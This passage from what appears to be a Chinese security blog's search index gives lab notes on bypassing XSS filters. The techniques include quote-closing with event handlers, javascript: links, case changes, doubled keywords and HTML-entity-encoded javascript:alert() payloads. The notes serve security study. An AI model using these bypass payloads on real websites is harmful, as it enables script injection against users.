src="/assets/image-20240811183024-0csq1vz.png" alt="image">​</p></li><li><p>对输入输出均进行了实体化，利用标签事件，并使用双引号闭合</p><p> <code>&quot; οnfοcus=javascript:alert() &quot;</code>​</p></li><li><p>关键字过滤 利用其他标签调用 双引号闭合</p><p> <code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code>​</p></li><li><p>大小写</p></li><li><p>双写</p></li><li><p>利用Unicode编码</p><p> <code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0029</code>​</p><p> <img src="/assets/image-20240811183710-2fpa91l.png" alt="image">​</p><p> <img src="/assets/image-20240811183729-xtiwubj.png" alt="image">​</p><p> 进行编码</p><p> <img src="/assets/image-20240811183842-60s2gbg.png" alt="image">​</p><p> 这个编码浏览器地址是能够识别的，但是在前端代码里不一定能够识别</p><p> 前端仍为编码后的内容</p><p> <img src="/assets/image-20240811183928-ph4ovws.png" alt="image">​</p></li><li><p>利用Unicode编码（内容检测）</p><p> <code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028)(&#39;http://&#39;)</code>​</p><p> <img src="/assets/image-20240811184105-hfuy0qn.png" alt="image">​</p><p> <img src="/assets/image-20240811184155-vsabezn.png" alt="image">​</p></li><li><p>10-20</p><p> 考查内容偏向ctf</p><p> <a href="https://blog.csdn.net/l2872253606/article/details/125638898">https://blog.csdn.net/l2872253606/article/details/125638898</a></p></li></ol></li></ol><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>XSS漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
